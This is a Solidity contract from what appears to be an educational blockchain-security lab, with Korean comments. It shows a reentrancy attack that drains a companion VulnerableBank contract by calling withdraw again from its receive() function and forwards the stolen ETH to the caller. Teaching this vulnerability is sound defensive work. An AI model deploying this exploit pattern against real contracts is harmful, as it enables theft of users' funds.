// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./VulnerableBank.sol";

/**
 * @title Attacker
 * @dev Ch08 실습 — 재진입 공격 시연 컨트랙트 (교육용)
 *
 * ⚠️  이 컨트랙트는 취약점 시연 목적으로만 사용.
 *
 * 공격 흐름:
 * 1. Attacker.attack() 호출 (1 ETH와 함께)
 * 2. VulnerableBank.deposit(1 ETH)
 * 3. VulnerableBank.withdraw() 호출
 * 4. 은행이 ETH 전송 → Attacker.receive() 트리거
 * 5. receive() 안에서 다시 VulnerableBank.withdraw() 호출 (재진입!)
 * 6. 은행 잔액이 바닥날 때까지 반복
 */
contract Attacker {

    VulnerableBank public bank;
    uint256 public attackAmount;

    event AttackExecuted(uint256 stolen);

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    /// @dev 공격 시작 (최소 1 ETH 필요)
    function attack() external payable {
        require(msg.value >= 0.1 ether, "Need ETH to attack");
        attackAmount = msg.value;

        // 1. 정상 예치
        bank.deposit{value: attackAmount}();

        // 2. 첫 번째 인출 → receive() 트리거
        bank.withdraw();

        // 훔친 ETH를 공격자에게 전송
        uint256 stolen = address(this).balance;
        emit AttackExecuted(stolen);
        payable(msg.sender).transfer(stolen);
    }

    /// @dev ETH를 받을 때마다 은행에 잔액이 있으면 다시 인출
    receive() external payable {
        if (address(bank).balance >= attackAmount) {
            bank.withdraw();  // 재진입!
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
